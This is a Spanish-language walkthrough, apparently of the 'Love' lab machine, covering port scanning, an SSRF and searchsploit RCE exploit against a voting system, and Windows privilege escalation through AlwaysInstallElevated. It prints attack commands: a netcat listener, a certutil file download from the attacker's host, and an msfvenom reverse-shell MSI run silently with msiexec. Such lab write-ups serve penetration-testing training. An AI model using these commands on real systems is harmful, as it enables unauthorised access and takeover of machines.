# Love

**Sistema Operativo**: Windows

**Dificultad**: Fácil

**Técnicas Vistas**: Server Side Request Forgery (SSRF) / 
Exploiting Voting System / 
Abusing AlwaysInstallElevated (msiexec/msi file)

Te prepara para las **Certificaciones**: eJPT / 
eWPT / 
OSCP (Escalada)

![image](https://github.com/user-attachments/assets/feef1627-bc61-468d-ba86-5989e24871c5)<br><br>

# Reconocimiento


Utilizando `nmap` encontramos estos puertos abiertos:<br>

![image](https://github.com/user-attachments/assets/bab736ff-d081-4755-85d4-c6977f92a156)

- `-p-` -> Escanea todos los puertos 
- `-sS` -> escaneo de tipo SYN
- `--open` -> Todos los puertos abiertos
- `--min-rate=5000` -> Manda mínimo 5000 paquetes por segundo
- `-Pn` -> Asume que el host especificado está activo
- `-n` -> Que no aplique resolución DNS
- `-oG allports` -> manda todo a un archivo con nombre de "allports"<br><br><br><br>

Encontramos un subdominio y dominio que lo ponemos en `/etc/hosts`<br><br>

![image](https://github.com/user-attachments/assets/440ea5df-5a7b-483f-b0e6-794ba236af27)<br><br>

# Explotación SSRF 

Tenemos las credenciales de `admin`<br>

![image](https://github.com/user-attachments/assets/7de4ae8b-1c76-4f3b-916e-f4e017cf77ce)<br><br>

Utilizando `searchsploit` vemos una autenticación RCE<br>

![image](https://github.com/user-attachments/assets/a397ba57-c4fb-4c0e-a0f6-b64b7a5b4853)<br><br>

Aplicamos estos cambios en el `exploit`<br>

![image](https://github.com/user-attachments/assets/04ea8ada-2237-4b1a-a559-3107e73685b6)

- `python3 exploit.py` -> Ganamos acceso<br><br>
- `rlwrap nc -nlvp 443`

# Escalada de privilegios

Nos descargamos el WinPEASx64.exe<br>

https://github.com/peass-ng/PEASS-ng/releases/tag/20240728-0f010225<br><br>

### Transferir archivo

- `C:\Windows\Temp` -> directorio como "tmp"
- `mkdir prives` -> Crear directorio
- `cd prives` -> Entramos al directorio creado
- `python3 -m http.server 80` -> Abro puerto con el binario en linux
- `certutil.exe -f -urlcache -split http://10.10.14.55/winPeas.exe winPeas.exe` -> Me transfiero el winPeas.exe al windows
- `.\winPeas.exe systeminfo` -> ejecutar<br><br>

Si el `AlwaysInstallElevated` esta en 1, es vulnerable<br>


![image](https://github.com/user-attachments/assets/6ab88c52-2667-40a3-9339-49de361bcaf5)<br><br>

Creamos una reverse shell con `msfvenom`

- ` msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST=10.10.14.55 LPORT=443 -f msi -o reverse.msi` -> Creamos el exploit<br>

Nos lo transferimos donde tenemos el `winPeas`

- `msiexec /quiet /qn /i reverse.msi`  -> Así lo ejecutamos<br><br>


Flag final:<br>

![image](https://github.com/user-attachments/assets/63613b84-4500-44b6-badd-025673b503b7)<br><br>
